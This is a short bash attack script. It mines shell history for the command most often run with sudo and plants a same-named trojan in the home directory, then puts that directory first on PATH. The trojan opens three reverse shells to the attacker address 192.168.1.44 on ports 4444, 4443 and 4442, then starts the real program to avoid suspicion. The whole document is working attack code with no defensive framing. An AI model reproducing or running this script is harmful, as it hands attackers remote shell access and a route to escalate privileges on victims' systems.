#!/bin/bash
# find most common app used with sudo
common=`history | grep sudo | awk '{print \$2, \$3}' | sort | uniq -c | sort -nr | awk '{print \$3}' | awk '(NR>=0 && NR<=11){print} (NR==1){exit}'`
location=`whereis \$common | awk '{print \$2}'`

# create malicious app
cat << EOF > $HOME/$common
#!/bin/bash
# open reverse shell 
# change IP and Port to your attack machine settings
bash -i >& /dev/tcp/192.168.1.44/4444 0>&1 2>&1 &
exec 196<>/dev/tcp/192.168.1.44/4443; sh <&196 >&196 2>&196 &
/bin/bash -l > /dev/tcp/192.168.1.44/4442 0<&1 2>&1 &
# open original program to prevent suspicion 
$location $1 $2 $3 $4 $5 $6 $7 $8 $9
EOF

# make new app executable
chmod 777 $HOME/$common

# add HOME directory to the PATH
export PATH=$HOME:$PATH
